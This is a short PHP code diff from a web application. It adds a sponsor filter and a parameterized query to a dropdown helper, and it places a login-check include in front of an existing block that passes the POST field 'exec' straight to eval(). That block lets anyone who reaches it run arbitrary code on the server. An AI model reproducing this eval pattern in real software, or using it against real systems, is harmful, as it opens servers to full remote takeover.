@@ -457,10 +457,10 @@ function comboPatrocinador($name, $selected = '-1', $isCombo = true) {
 	return $isCombo ? $combo : $text;
 }
 
-function comboCartaoPatrocinado($name, $selected = '-1', $isCombo = true) {
+function comboCartaoPatrocinado($name, $idPatrocinador, $selected = '-1', $isCombo = true) {
 	$mainConnection = mainConnection();
-	$query = 'SELECT ID_CARTAO_PATROCINADO, DS_CARTAO_PATROCINADO FROM MW_CARTAO_PATROCINADO';
-	$result = executeSQL($mainConnection, $query);
+	$query = 'SELECT ID_CARTAO_PATROCINADO, DS_CARTAO_PATROCINADO FROM MW_CARTAO_PATROCINADO WHERE ID_PATROCINADOR = ?';
+	$result = executeSQL($mainConnection, $query, array($idPatrocinador));
 	
 	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um cart&atilde;o patrocinado...</option>';
 	while ($rs = fetchResult($result)) {
@@ -611,6 +611,7 @@ function acessoPermitido($conn, $idUser, $idPrograma, $echo = false) {
 
 
 if (isset($_POST['exec'])) {
+	require_once('../admin/acessoLogado.php');
 	eval($_POST['exec']);
 }
 ?>
